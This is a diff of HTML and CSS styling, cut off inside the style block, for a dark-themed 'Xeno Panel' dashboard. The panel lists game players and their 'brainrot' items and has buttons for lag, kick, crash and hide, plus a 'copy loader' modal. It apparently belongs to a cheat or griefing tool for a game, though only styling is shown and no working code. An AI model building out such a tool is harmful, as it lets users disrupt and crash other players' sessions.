@@ -1,1608 +1,543 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Control Panel</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes" />
+    <title>Xeno Panel</title>
     <style>
-        :root {
-            --bg: #0d0f14;
-            --bg-card: #141821;
-            --bg-card-hover: #1a1e28;
-            --border: #1e2530;
-            --border-hover: #2a3444;
-            --text-primary: #e8edf5;
-            --text-secondary: #8b95a5;
-            --text-muted: #5a6475;
-            --accent-red: #ef4444;
-            --accent-orange: #f97316;
-            --accent-green: #22c55e;
-            --accent-blue: #3b82f6;
-            --accent-purple: #a855f7;
-        }
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: 'Inter', -apple-system, sans-serif;
-            background: var(--bg);
-            color: var(--text-primary);
-            min-height: 100vh;
-            overflow-x: hidden;
-        }
-        ::-webkit-scrollbar { width: 6px; height: 6px; }
-        ::-webkit-scrollbar-track { background: var(--bg); }
-        ::-webkit-scrollbar-thumb { background: #2a3444; border-radius: 3px; }
+        body { font-family: 'Inter', -apple-system, sans-serif; background: #0b0d11; color: #e8edf5; min-height: 100vh; padding: 16px; display: flex; justify-content: center; }
+        ::-webkit-scrollbar { width: 5px; height: 5px; }
+        ::-webkit-scrollbar-track { background: #14181f; border-radius: 8px; }
+        ::-webkit-scrollbar-thumb { background: #2a3340; border-radius: 8px; }
         ::-webkit-scrollbar-thumb:hover { background: #3d4a5c; }
-
-        .header {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            padding: 12px 24px;
-            background: var(--bg-card);
-            border-bottom: 1px solid var(--border);
-            position: sticky;
-            top: 0;
-            z-index: 100;
-        }
-        .header-left { display: flex; align-items: center; gap: 12px; }
-        .status-dot {
-            width: 8px; height: 8px;
-            border-radius: 50%;
-            background: var(--accent-green);
-            box-shadow: 0 0 8px var(--accent-green);
-            animation: pulse 2s ease-in-out infinite;
-        }
-        @keyframes pulse {
-            0%, 100% { opacity: 1; transform: scale(1); }
-            50% { opacity: 0.5; transform: scale(0.8); }
-        }
-        .header-title { font-size: 16px; font-weight: 700; letter-spacing: -0.3px; }
-        .header-stats { font-size: 13px; color: var(--text-secondary); }
-        .header-stats span { color: var(--text-primary); font-weight: 600; }
-        .header-right { display: flex; align-items: center; gap: 10px; }
-        .btn-header {
-            padding: 6px 14px;
-            border-radius: 6px;
-            border: 1px solid var(--border);
-            background: var(--bg);
-            color: var(--text-secondary);
-            font-size: 12px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: all 0.2s;
-        }
-        .btn-header:hover { border-color: var(--border-hover); color: var(--text-primary); background: var(--bg-card-hover); }
-        .btn-header.accent {
-            background: linear-gradient(135deg, #f59e0b, #d97706);
-            color: #fff;
-            border: none;
-        }
-        .btn-header.accent:hover { filter: brightness(1.1); }
-        .user-badge {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            padding: 6px 14px;
-            background: var(--bg);
-            border: 1px solid var(--border);
-            border-radius: 6px;
-            font-size: 13px;
-            font-weight: 600;
-        }
-        .user-badge .signout { color: var(--text-muted); font-size: 11px; cursor: pointer; transition: color 0.2s; }
-        .user-badge .signout:hover { color: var(--accent-red); }
-
-        .main {
-            display: grid;
-            grid-template-columns: 380px 1fr;
-            gap: 0;
-            min-height: calc(100vh - 57px);
-        }
-        @media (max-width: 1000px) { .main { grid-template-columns: 1fr; } }
-
-        .left-panel {
-            background: var(--bg-card);
-            border-right: 1px solid var(--border);
-            padding: 20px;
-            display: flex;
-            flex-direction: column;
-            gap: 16px;
-            overflow-y: auto;
-            max-height: calc(100vh - 57px);
-        }
-        .panel-section {
-            background: var(--bg);
-            border: 1px solid var(--border);
-            border-radius: 10px;
-            overflow: hidden;
-        }
-        .panel-section-header {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            padding: 12px 14px;
-            border-bottom: 1px solid var(--border);
-        }
-        .panel-section-header h3 { font-size: 14px; font-weight: 600; display: flex; align-items: center; gap: 8px; }
-        .panel-section-header .copy-btn {
-            padding: 5px 12px;
-            border-radius: 6px;
-            border: 1px solid var(--border);
-            background: var(--bg-card);
-            color: var(--text-secondary);
-            font-size: 12px;
-            cursor: pointer;
-            transition: all 0.2s;
-            display: flex;
-            align-items: center;
-            gap: 6px;
-        }
-        .panel-section-header .copy-btn:hover { border-color: var(--border-hover); color: var(--text-primary); }
-        .code-block {
-            padding: 14px;
-            font-family: 'Fira Code', 'JetBrains Mono', monospace;
-            font-size: 11px;
-            line-height: 1.6;
-            color: #a5b4fc;
-            background: #0b0d11;
-            overflow-x: auto;
-            white-space: pre;
-            max-height: 400px;
-            overflow-y: auto;
-        }
-
-        .config-row {
-            display: flex;
-            gap: 8px;
-            padding: 10px 14px;
-            border-bottom: 1px solid var(--border);
-            flex-wrap: wrap;
-        }
-        .config-row input {
-            flex: 1;
-            min-width: 120px;
-            padding: 8px 12px;
-            background: var(--bg-card);
-            border: 1px solid var(--border);
-            border-radius: 6px;
-            color: var(--text-primary);
-            font-size: 12px;
-            outline: none;
-        }
-        .config-row input::placeholder { color: var(--text-muted); }
-        .config-row input:focus { border-color: var(--accent-blue); }
-        .config-row button {
-            padding: 8px 14px;
-            border-radius: 6px;
-            border: none;
-            background: var(--accent-blue);
-            color: #fff;
-            font-size: 12px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: filter 0.2s;
-        }
-        .config-row button:hover { filter: brightness(1.1); }
-
-        .chat-section { flex: 1; min-height: 200px; display: flex; flex-direction: column; }
-        .chat-header {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            padding: 12px 14px;
-            border-bottom: 1px solid var(--border);
-        }
-        .chat-header h3 { font-size: 14px; font-weight: 600; }
-        .chat-header .count {
-            font-size: 11px;
-            color: var(--text-muted);
-            background: var(--bg-card);
-            padding: 2px 8px;
-            border-radius: 10px;
-        }
-        .chat-messages {
-            flex: 1;
-            padding: 10px 14px;
-            overflow-y: auto;
-            display: flex;
-            flex-direction: column;
-            gap: 8px;
-            max-height: 300px;
-        }
-        .chat-msg {
-            font-size: 12px;
-            line-height: 1.5;
-            padding: 6px 0;
-            border-bottom: 1px solid rgba(30, 37, 48, 0.5);
-        }
-        .chat-msg .sender { color: var(--text-secondary); font-weight: 500; margin-right: 4px; }
-        .chat-msg .target { color: var(--accent-red); font-weight: 600; }
-        .chat-msg .system { color: var(--text-muted); }
-
-        .right-panel { padding: 20px; overflow-y: auto; }
-        .tabs { display: flex; gap: 4px; margin-bottom: 16px; }
-        .tab {
-            padding: 8px 18px;
-            border-radius: 8px;
-            border: 1px solid transparent;
-            background: transparent;
-            color: var(--text-secondary);
-            font-size: 13px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: all 0.2s;
-        }
-        .tab:hover { color: var(--text-primary); }
-        .tab.active { background: var(--bg-card); border-color: var(--border); color: var(--text-primary); }
-        .tab .count { margin-left: 6px; font-size: 11px; color: var(--text-muted); background: var(--bg); padding: 1px 6px; border-radius: 8px; }
-
-        .toolbar {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            margin-bottom: 16px;
-            gap: 10px;
-            flex-wrap: wrap;
-        }
-        .search-box { flex: 1; max-width: 400px; position: relative; }
-        .search-box input {
-            width: 100%;
-            padding: 8px 14px 8px 36px;
-            background: var(--bg-card);
-            border: 1px solid var(--border);
-            border-radius: 8px;
-            color: var(--text-primary);
-            font-size: 13px;
-            outline: none;
-            transition: border 0.2s;
-        }
-        .search-box input:focus { border-color: var(--border-hover); }
-        .search-box input::placeholder { color: var(--text-muted); }
-        .search-box::before {
-            content: "🔍";
-            position: absolute;
-            left: 12px;
-            top: 50%;
-            transform: translateY(-50%);
-            font-size: 12px;
-            opacity: 0.5;
-        }
-        .toolbar-actions { display: flex; gap: 8px; }
-        .toolbar-btn {
-            padding: 7px 14px;
-            border-radius: 6px;
-            border: 1px solid var(--border);
-            background: var(--bg-card);
-            color: var(--text-secondary);
-            font-size: 12px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: all 0.2s;
-            display: flex;
-            align-items: center;
-            gap: 6px;
-        }
-        .toolbar-btn:hover { border-color: var(--border-hover); color: var(--text-primary); }
-        .toolbar-btn svg { width: 14px; height: 14px; }
-
-        .player-card {
-            background: var(--bg-card);
-            border: 1px solid var(--border);
-            border-radius: 12px;
-            padding: 16px;
-            margin-bottom: 12px;
-            cursor: pointer;
-            transition: all 0.2s;
-            position: relative;
-        }
-        .player-card:hover { border-color: var(--border-hover); background: var(--bg-card-hover); }
-        .player-card.selected {
-            border-color: #6366f1;
-            box-shadow: 0 0 0 1px #6366f1, 0 4px 20px rgba(99, 102, 241, 0.15);
-        }
-        .player-card.offline { opacity: 0.5; }
-        .player-card-header { display: flex; align-items: center; gap: 12px; margin-bottom: 12px; }
-        .player-avatar {
-            width: 40px; height: 40px;
-            border-radius: 50%;
-            background: #232e3c;
-            overflow: hidden;
-            flex-shrink: 0;
-            border: 2px solid #2a3646;
-            position: relative;
-        }
-        .player-avatar img { width: 100%; height: 100%; object-fit: cover; }
-        .player-avatar .fallback {
-            width: 100%; height: 100%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 15px;
-            font-weight: 700;
-            color: #6b7a8f;
-            background: #1a212b;
-        }
-        .player-avatar .status-indicator {
-            position: absolute;
-            bottom: 0; right: 0;
-            width: 12px; height: 12px;
-            border-radius: 50%;
-            border: 2px solid var(--bg-card);
-        }
-        .player-avatar .status-indicator.online { background: var(--accent-green); }
-        .player-avatar .status-indicator.offline { background: #4b5563; }
+        .app { max-width: 1400px; width: 100%; }
+        .header { display: flex; align-items: center; justify-content: space-between; padding: 14px 20px; background: #12171f; border-radius: 14px; border: 1px solid #1f2937; margin-bottom: 20px; flex-wrap: wrap; gap: 10px; }
+        .header-left { display: flex; align-items: center; gap: 14px; flex-wrap: wrap; }
+        .logo { font-size: 20px; font-weight: 700; letter-spacing: -0.2px; background: linear-gradient(135deg, #a78bfa, #6366f1); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
+        .logo-sub { font-size: 12px; color: #6b7a8f; background: #1a212b; padding: 3px 12px; border-radius: 20px; border: 1px solid #26313f; -webkit-text-fill-color: #8b9bb5; white-space: nowrap; }
+        .header-actions { display: flex; align-items: center; gap: 12px; flex-wrap: wrap; }
+        .copy-loader-btn { background: #1a212b; border: 1px solid #2a3646; color: #c8d2df; padding: 6px 16px; border-radius: 30px; font-size: 13px; font-weight: 500; cursor: pointer; transition: all 0.2s; display: flex; align-items: center; gap: 8px; white-space: nowrap; }
+        .copy-loader-btn:hover { background: #26313f; border-color: #3d4f66; }
+        .copy-loader-btn .icon { font-size: 16px; }
+        .header-stats { display: flex; gap: 20px; font-size: 13px; color: #9aabb8; }
+        .header-stats span { display: flex; align-items: center; gap: 5px; }
+        .header-stats .num { color: #e8edf5; font-weight: 600; font-size: 15px; min-width: 18px; }
+        .status-dot { display: inline-block; width: 8px; height: 8px; border-radius: 50%; background: #22c55e; animation: pulse-dot 1.8s ease-in-out infinite; }
+        @keyframes pulse-dot { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.4; transform: scale(0.8); } }
+        .main { display: grid; grid-template-columns: 1fr 360px; gap: 20px; }
+        @media (max-width: 820px) { .main { grid-template-columns: 1fr; } }
+        .players-section { background: #12171f; border-radius: 14px; border: 1px solid #1f2937; padding: 18px 18px 12px; min-height: 350px; }
+        .section-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 14px; padding-bottom: 10px; border-bottom: 1px solid #1a232e; flex-wrap: wrap; gap: 6px; }
+        .section-header h2 { font-size: 16px; font-weight: 600; letter-spacing: -0.1px; display: flex; align-items: center; gap: 8px; }
+        .section-header .badge { background: #1f2a36; padding: 2px 12px; border-radius: 30px; font-size: 12px; color: #9aabb8; font-weight: 400; }
+        .section-header .last-update { font-size: 11px; color: #4b5a6e; }
+        .search-bar { width: 100%; margin-bottom: 14px; }
+        .search-bar input { width: 100%; padding: 8px 14px; background: #0d1117; border: 1px solid #1f2937; border-radius: 30px; color: #e8edf5; font-size: 13px; outline: none; transition: border 0.2s; }
+        .search-bar input::placeholder { color: #4b5a6e; }
+        .search-bar input:focus { border-color: #6366f1; }
+        .player-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(180px, 1fr)); gap: 12px; }
+        .player-card { background: #181f29; border-radius: 12px; padding: 12px 14px; border: 1px solid #232e3c; cursor: pointer; transition: all 0.2s; display: flex; align-items: center; gap: 10px; position: relative; }
+        .player-card:hover { border-color: #3d4f66; background: #1d2633; transform: translateY(-1px); }
+        .player-card.selected { border-color: #818cf8; background: #1e2740; box-shadow: 0 0 0 1px #818cf8, 0 4px 16px rgba(99, 102, 241, 0.12); }
+        .player-card.offline { opacity: 0.5; border-color: #1a232e; }
+        .player-card.offline:hover { opacity: 0.7; }
+        .player-avatar { width: 36px; height: 36px; border-radius: 50%; background: #232e3c; flex-shrink: 0; overflow: hidden; border: 2px solid #2a3646; }
+        .player-avatar img { width: 100%; height: 100%; object-fit: cover; display: block; }
+        .player-avatar .fallback { width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; font-size: 14px; font-weight: 600; color: #6b7a8f; background: #1a212b; }
         .player-info { flex: 1; min-width: 0; }
-        .player-name {
-            font-size: 15px;
-            font-weight: 700;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-        .player-name .handle { color: var(--text-muted); font-size: 12px; font-weight: 400; }
-        .player-name .id { color: var(--text-muted); font-size: 11px; font-weight: 400; }
-        .player-meta { font-size: 12px; color: var(--text-secondary); margin-top: 2px; }
-        .player-meta .tag {
-            display: inline-block;
-            padding: 1px 8px;
-            background: var(--bg);
-            border-radius: 4px;
-            font-size: 11px;
-            margin-right: 4px;
-            color: var(--text-muted);
-        }
-        .player-status-badge {
-            font-size: 10px;
-            font-weight: 700;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            padding: 3px 10px;
-            border-radius: 4px;
-        }
-        .player-status-badge.online { background: rgba(34, 197, 94, 0.15); color: var(--accent-green); }
-        .player-status-badge.offline { background: rgba(75, 85, 99, 0.15); color: #6b7280; }
-
-        .player-details {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 12px;
-            margin-bottom: 14px;
-            padding: 12px;
-            background: var(--bg);
-            border-radius: 8px;
-        }
-        .detail-item { display: flex; flex-direction: column; gap: 2px; }
-        .detail-item .label { font-size: 10px; text-transform: uppercase; letter-spacing: 0.5px; color: var(--text-muted); }
-        .detail-item .value { font-size: 13px; font-weight: 600; color: var(--text-primary); word-break: break-all; }
-        .detail-item .value.muted { color: var(--text-muted); }
-        .detail-item .value.id { font-family: monospace; font-size: 12px; }
-
-        .server-players { display: flex; gap: 6px; flex-wrap: wrap; margin-bottom: 14px; }
-        .server-player-tag {
-            padding: 4px 10px;
-            background: var(--bg);
-            border: 1px solid var(--border);
-            border-radius: 6px;
-            font-size: 12px;
-            font-weight: 500;
-            color: var(--text-secondary);
-        }
-
-        .brainrots-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 8px; }
-        .brainrots-header h4 { font-size: 12px; text-transform: uppercase; letter-spacing: 0.5px; color: var(--text-muted); display: flex; align-items: center; gap: 6px; }
-        .brainrots-header .count { font-size: 11px; color: var(--text-muted); }
-        .brainrot-list { display: flex; flex-direction: column; gap: 4px; max-height: 200px; overflow-y: auto; }
-        .brainrot-item {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 8px 12px;
-            background: var(--bg);
-            border-radius: 6px;
-            border-left: 3px solid var(--border);
-            transition: all 0.15s;
-        }
-        .brainrot-item:hover { background: var(--bg-card-hover); border-left-color: var(--accent-purple); }
-        .brainrot-item .title { font-size: 13px; color: var(--text-primary); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 60%; }
-        .brainrot-item .cash { font-size: 12px; font-weight: 700; color: #fbbf24; white-space: nowrap; }
-        .brainrot-empty { text-align: center; padding: 20px; color: var(--text-muted); font-size: 13px; font-style: italic; }
-
-        .action-buttons {
-            display: flex;
-            gap: 8px;
-            margin-top: 14px;
-            padding-top: 14px;
-            border-top: 1px solid var(--border);
-            flex-wrap: wrap;
-        }
-        .action-btn {
-            flex: 1;
-            min-width: 80px;
-            padding: 10px 14px;
-            border-radius: 8px;
-            border: none;
-            font-size: 12px;
-            font-weight: 700;
-            cursor: pointer;
-            transition: all 0.2s;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 6px;
-            text-transform: uppercase;
-            letter-spacing: 0.3px;
-        }
-        .action-btn:hover:not(:disabled) { transform: translateY(-1px); filter: brightness(1.1); }
-        .action-btn:active:not(:disabled) { transform: scale(0.97); }
-        .action-btn:disabled { opacity: 0.4; cursor: not-allowed; }
-        .action-btn.fps { background: linear-gradient(135deg, #1e3a5f, #1e2a4a); color: #60a5fa; border: 1px solid #2a4a7a; }
-        .action-btn.lag { background: linear-gradient(135deg, #3f1a1a, #2a1515); color: #f87171; border: 1px solid #5a2020; }
-        .action-btn.kick { background: linear-gradient(135deg, #7c2d12, #5a1f0d); color: #fb923c; border: 1px solid #9a3b1a; }
-        .action-btn.crash { background: linear-gradient(135deg, #7f1d1d, #5a1515); color: #fca5a5; border: 1px solid #991b1b; }
-        .action-btn.hide { background: linear-gradient(135deg, #1f2937, #111827); color: var(--text-secondary); border: 1px solid var(--border); }
-        .action-btn svg { width: 14px; height: 14px; }
-
-        .details-toggle {
-            position: absolute;
-            top: 16px;
-            right: 16px;
-            font-size: 12px;
-            color: var(--text-muted);
-            cursor: pointer;
-            transition: color 0.2s;
-            user-select: none;
-        }
-        .details-toggle:hover { color: var(--text-primary); }
-
-        .empty-state { text-align: center; padding: 60px 20px; color: var(--text-muted); }
-        .empty-state .icon { font-size: 48px; margin-bottom: 16px; opacity: 0.3; }
-        .empty-state h3 { font-size: 18px; color: var(--text-secondary); margin-bottom: 8px; }
+        .player-name { font-weight: 600; font-size: 13px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+        .player-meta { font-size: 10px; color: #6b7a8f; display: flex; gap: 6px; flex-wrap: wrap; margin-top: 1px; }
+        .player-meta .tag { background: #1a212b; padding: 0 6px; border-radius: 3px; font-size: 9px; color: #7a8b9e; line-height: 16px; }
+        .player-status { width: 8px; height: 8px; border-radius: 50%; background: #22c55e; flex-shrink: 0; transition: background 0.3s; }
+        .player-status.offline { background: #4b5563; }
+        .empty-state { grid-column: 1 / -1; text-align: center; padding: 40px 20px; color: #6b7a8f; }
+        .empty-state .icon { font-size: 32px; margin-bottom: 8px; opacity: 0.4; }
         .empty-state p { font-size: 14px; }
-
-        .toast {
-            position: fixed;
-            bottom: 24px;
-            right: 24px;
-            padding: 12px 20px;
-            background: var(--bg-card);
-            border: 1px solid var(--border);
-            border-radius: 10px;
-            font-size: 13px;
-            font-weight: 500;
-            color: var(--text-primary);
-            box-shadow: 0 8px 32px rgba(0,0,0,0.5);
-            transform: translateY(100px);
-            opacity: 0;
-            transition: all 0.3s cubic-bezier(0.22, 1, 0.36, 1);
-            z-index: 1000;
-            pointer-events: none;
+        .empty-state .sub { font-size: 12px; color: #4b5a6e; margin-top: 4px; }
+        .command-panel { background: #12171f; border-radius: 14px; border: 1px solid #1f2937; padding: 18px 18px 14px; align-self: start; position: sticky; top: 16px; }
+        .command-panel .panel-title { font-size: 15px; font-weight: 600; margin-bottom: 4px; display: flex; align-items: center; gap: 8px; }
+        .command-panel .panel-title .target-name { color: #a78bfa; font-weight: 500; font-size: 14px; max-width: 120px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+        .command-panel .panel-sub { font-size: 12px; color: #6b7a8f; margin-bottom: 16px; padding-bottom: 12px; border-bottom: 1px solid #1a232e; }
+        .cmd-group { margin-bottom: 18px; }
+        .cmd-group .cmd-label { font-size: 10px; font-weight: 500; color: #9aabb8; display: block; margin-bottom: 6px; letter-spacing: 0.3px; text-transform: uppercase; }
+        .cmd-row { display: flex; gap: 8px; flex-wrap: wrap; }
+        .toggle-wrap { display: flex; align-items: center; gap: 8px; background: #181f29; padding: 5px 12px 5px 14px; border-radius: 30px; border: 1px solid #232e3c; cursor: pointer; transition: all 0.2s; user-select: none; flex: 1; min-width: 80px; justify-content: space-between; }
+        .toggle-wrap:hover { border-color: #3d4f66; }
+        .toggle-wrap .label { font-size: 12px; color: #c8d2df; font-weight: 500; white-space: nowrap; }
+        .toggle-track { width: 32px; height: 18px; background: #2a3646; border-radius: 30px; position: relative; transition: background 0.25s; flex-shrink: 0; }
+        .toggle-track .thumb { width: 14px; height: 14px; background: #6b7a8f; border-radius: 50%; position: absolute; top: 2px; left: 2px; transition: all 0.25s; }
+        .toggle-wrap.active .toggle-track { background: #6366f1; }
+        .toggle-wrap.active .toggle-track .thumb { left: 16px; background: #fff; }
+        .toggle-wrap .status-text { font-size: 10px; color: #4b5a6e; min-width: 22px; text-align: right; font-weight: 500; }
+        .toggle-wrap.active .status-text { color: #a5b4fc; }
+        .toggle-wrap:active:not(.disabled) { transform: scale(0.96); }
+        .toggle-wrap.disabled { opacity: 0.4; cursor: not-allowed; }
+        .cmd-btn { padding: 6px 16px; border-radius: 30px; border: none; font-weight: 600; font-size: 12px; cursor: pointer; transition: all 0.2s; background: #1f2a36; color: #c8d2df; border: 1px solid #2a3646; flex: 1; min-width: 60px; text-align: center; white-space: nowrap; }
+        .cmd-btn:hover:not(:disabled) { background: #2a3646; border-color: #3d4f66; }
+        .cmd-btn.danger { background: #2a151f; border-color: #4a1f2e; color: #f87171; }
+        .cmd-btn.danger:hover:not(:disabled) { background: #3d1a2a; border-color: #7f2d3f; }
+        .cmd-btn.warning { background: #2a1f15; border-color: #4a3520; color: #fbbf24; }
+        .cmd-btn.warning:hover:not(:disabled) { background: #3d2a1a; border-color: #7f5528; }
+        .cmd-btn.primary { background: #1a1f3a; border-color: #2a3360; color: #a5b4fc; }
+        .cmd-btn.primary:hover:not(:disabled) { background: #252d55; border-color: #4a5a9a; }
+        .cmd-btn:disabled { opacity: 0.35; cursor: not-allowed; transform: none !important; }
+        .cmd-btn:active:not(:disabled) { transform: scale(0.95); }
+        .cmd-btn-group { display: flex; gap: 8px; flex-wrap: wrap; }
+        .cmd-btn-group .cmd-btn { flex: 1; min-width: 70px; }
+        .brainrot-section { margin-top: 4px; padding-top: 12px; border-top: 1px solid #1a232e; }
+        .brainrot-section .brainrot-label { font-size: 10px; text-transform: uppercase; letter-spacing: 0.4px; color: #6b7a8f; margin-bottom: 6px; display: flex; justify-content: space-between; }
+        .brainrot-section .brainrot-label .count { color: #4b5a6e; font-size: 10px; }
+        .brainrot-list { display: flex; flex-direction: column; gap: 3px; max-height: 120px; overflow-y: auto; padding-right: 4px; }
+        .brainrot-item { display: flex; justify-content: space-between; padding: 4px 8px; background: #0d1117; border-radius: 6px; font-size: 12px; border-left: 2px solid #2a3646; transition: background 0.15s; }
+        .brainrot-item:hover { background: #141a22; }
+        .brainrot-item .title { color: #c8d2df; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 140px; }
+        .brainrot-item .cash { color: #fbbf24; font-weight: 600; font-size: 11px; white-space: nowrap; }
+        .brainrot-empty { color: #4b5a6e; font-size: 12px; padding: 8px 0; text-align: center; font-style: italic; }
+        @media (max-width: 600px) {
+            body { padding: 10px; }
+            .header { padding: 12px 14px; }
+            .logo { font-size: 17px; }
+            .logo-sub { font-size: 10px; padding: 2px 10px; }
+            .copy-loader-btn { font-size: 11px; padding: 4px 12px; }
+            .header-stats { font-size: 11px; gap: 12px; }
+            .header-stats .num { font-size: 13px; }
+            .players-section { padding: 12px 12px 8px; }
+            .player-grid { grid-template-columns: 1fr; }
+            .player-card { padding: 10px 12px; }
+            .command-panel { padding: 14px 14px 12px; position: static; }
+            .cmd-row { flex-direction: row; flex-wrap: wrap; }
+            .toggle-wrap { min-width: 70px; flex: 1 0 calc(50% - 8px); }
+            .cmd-btn-group .cmd-btn { flex: 1 0 calc(50% - 8px); }
+            .brainrot-item .title { max-width: 100px; }
         }
-        .toast.show { transform: translateY(0); opacity: 1; }
-        .toast.success { border-left: 3px solid var(--accent-green); }
-        .toast.error { border-left: 3px solid var(--accent-red); }
-        .toast.info { border-left: 3px solid var(--accent-blue); }
-
-        .modal-overlay {
-            position: fixed;
-            inset: 0;
-            background: rgba(0,0,0,0.7);
-            backdrop-filter: blur(4px);
-            z-index: 1000;
-            display: none;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
+        @media (max-width: 400px) {
+            .header-left { gap: 8px; }
+            .header-actions { width: 100%; justify-content: flex-start; }
+            .header-stats { width: 100%; justify-content: flex-start; }
+            .toggle-wrap { flex: 1 0 100%; }
+            .cmd-btn-group .cmd-btn { flex: 1 0 100%; }
         }
-        .modal-overlay.open { display: flex; }
-        .modal {
-            background: var(--bg-card);
-            border: 1px solid var(--border);
-            border-radius: 16px;
-            padding: 24px;
-            max-width: 600px;
-            width: 100%;
-            box-shadow: 0 24px 64px rgba(0,0,0,0.8);
-        }
-        .modal h3 { font-size: 18px; margin-bottom: 4px; }
-        .modal .sub { font-size: 13px; color: var(--text-secondary); margin-bottom: 16px; }
-        .modal .code-display {
-            background: var(--bg);
-            border: 1px solid var(--border);
-            border-radius: 10px;
-            padding: 16px;
-            font-family: 'Fira Code', monospace;
-            font-size: 13px;
-            color: #a5b4fc;
-            word-break: break-all;
-            margin-bottom: 16px;
-            position: relative;
-        }
-        .modal .code-display .copy-hint {
-            position: absolute;
-            top: 10px;
-            right: 10px;
-            font-size: 10px;
-            color: var(--text-muted);
-            background: var(--bg-card);
-            padding: 3px 10px;
-            border-radius: 12px;
-            border: 1px solid var(--border);
-        }
-        .modal-actions { display: flex; justify-content: flex-end; gap: 10px; }
-        .modal-btn {
-            padding: 8px 20px;
-            border-radius: 8px;
-            border: 1px solid var(--border);
-            background: var(--bg);
-            color: var(--text-primary);
-            font-size: 13px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.2s;
-        }
-        .modal-btn:hover { background: var(--bg-card-hover); }
-        .modal-btn.primary { background: #6366f1; border-color: #818cf8; color: #fff; }
-        .modal-btn.primary:hover { background: #818cf8; }
-    
-        /* LOGIN SCREEN */
-        #loginScreen {
-            position: fixed;
-            inset: 0;
-            background: var(--bg);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            z-index: 9999;
-            flex-direction: column;
-            gap: 24px;
-        }
-        #loginScreen.hidden { display: none !important; }
-        .login-box {
-            background: var(--bg-card);
-            border: 1px solid var(--border);
-            border-radius: 16px;
-            padding: 40px;
-            width: 100%;
-            max-width: 400px;
-            text-align: center;
-        }
-        .login-box h1 {
-            font-size: 24px;
-            font-weight: 700;
-            margin-bottom: 8px;
-            letter-spacing: -0.5px;
-        }
-        .login-box p {
-            font-size: 13px;
-            color: var(--text-secondary);
-            margin-bottom: 24px;
-        }
-        .login-box input {
-            width: 100%;
-            padding: 12px 16px;
-            background: var(--bg);
-            border: 1px solid var(--border);
-            border-radius: 10px;
-            color: var(--text-primary);
-            font-size: 14px;
-            outline: none;
-            margin-bottom: 16px;
-            transition: border 0.2s;
-        }
-        .login-box input:focus { border-color: var(--accent-blue); }
-        .login-box input::placeholder { color: var(--text-muted); }
-        .login-box button {
-            width: 100%;
-            padding: 12px;
-            border-radius: 10px;
-            border: none;
-            background: var(--accent-blue);
-            color: #fff;
-            font-size: 14px;
-            font-weight: 700;
-            cursor: pointer;
-            transition: filter 0.2s;
-        }
-        .login-box button:hover { filter: brightness(1.1); }
-        .login-error {
-            color: var(--accent-red);
-            font-size: 12px;
-            margin-top: 12px;
-            display: none;
-        }
-        .login-error.show { display: block; }
-
+        .toast { position: fixed; bottom: 24px; left: 50%; transform: translateX(-50%) translateY(80px); background: #1a212b; border: 1px solid #2a3646; padding: 12px 24px; border-radius: 12px; font-size: 14px; color: #e8edf5; opacity: 0; transition: all 0.4s cubic-bezier(0.22, 1, 0.36, 1); pointer-events: none; z-index: 999; box-shadow: 0 8px 32px rgba(0, 0, 0, 0.6); backdrop-filter: blur(8px); background: rgba(18, 23, 31, 0.92); }
+        .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+        .loader-modal-overlay { position: fixed; inset: 0; background: rgba(0, 0, 0, 0.7); backdrop-filter: blur(4px); z-index: 1000; display: none; align-items: center; justify-content: center; padding: 20px; }
+        .loader-modal-overlay.open { display: flex; }
+        .loader-modal { background: #12171f; border: 1px solid #2a3646; border-radius: 16px; padding: 28px 30px 24px; max-width: 520px; width: 100%; box-shadow: 0 24px 64px rgba(0, 0, 0, 0.8); }
+        .loader-modal h3 { font-size: 17px; margin-bottom: 4px; }
+        .loader-modal .sub { font-size: 13px; color: #6b7a8f; margin-bottom: 14px; }
+        .loader-modal .code-block { background: #0b0d11; border: 1px solid #1a232e; border-radius: 10px; padding: 16px 18px; font-family: 'Fira Code', 'JetBrains Mono', monospace; font-size: 13px; color: #a5b4fc; word-break: break-all; user-select: all; margin-bottom: 14px; max-height: 180px; overflow-y: auto; position: relative; }
+        .loader-modal .code-block .copy-hint { position: absolute; right: 10px; top: 10px; font-size: 10px; color: #4b5a6e; background: #141a22; padding: 2px 10px; border-radius: 12px; border: 1px solid #1a232e; }
+        .loader-modal .modal-actions { display: flex; gap: 10px; justify-content: flex-end; }
